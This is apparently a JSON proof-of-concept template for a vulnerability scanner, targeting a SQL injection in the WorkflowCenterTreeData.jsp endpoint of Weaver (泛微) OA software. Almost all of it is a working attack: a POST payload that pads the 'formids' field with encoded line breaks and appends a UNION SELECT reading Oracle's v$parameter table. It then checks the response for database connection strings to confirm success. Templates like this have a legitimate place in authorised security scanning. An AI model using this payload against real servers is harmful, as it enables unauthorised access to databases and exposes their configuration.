{
    "Name": "泛微_WorkflowCenterTreeData接口SQL注入",
    "Description": "WorkflowCenterTreeData接口SQL注入",
    "Product": "泛微",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded"},
        "Uri":"/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333",
        "Port":"",
        "Data":"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1",
        "follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
            "Check_Steps":"AND",
            "Checks": [
                    {
                    "Operation": "contains", 
                    "Key":"",
                    "Value": "(PROTOCOL=TCP)"
                    },
                    {
                        "Operation": "contains", 
                        "Key":"",
                        "Value": "(SERVICE=orclXDB)"
                        },
                     {
                    "Operation": "code", 
                    "Key":"",
                    "Value": "200"  
                     }
            ]
            },
            "Next_decide":""
        }
    ]}